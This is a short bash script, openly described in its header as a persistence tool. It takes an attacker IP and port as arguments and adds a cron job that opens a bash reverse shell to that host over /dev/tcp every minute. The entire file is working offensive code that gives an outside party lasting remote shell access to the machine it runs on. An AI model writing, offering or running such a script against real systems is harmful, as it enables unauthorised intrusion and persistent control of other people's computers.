#!/bin/bash
# cron_persistence.sh - Add a cron job for a reverse shell persistence mechanism.
if [ -z "$1" ] || [ -z "$2" ]; then
   echo "Usage: $0 <attacker_ip> <attacker_port>"
   exit 1
fi
echo "Adding cron job for persistent reverse shell to $1:$2..."
(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/'"$1"'/'"$2"' 0>&1') | crontab -
echo "Cron job added."
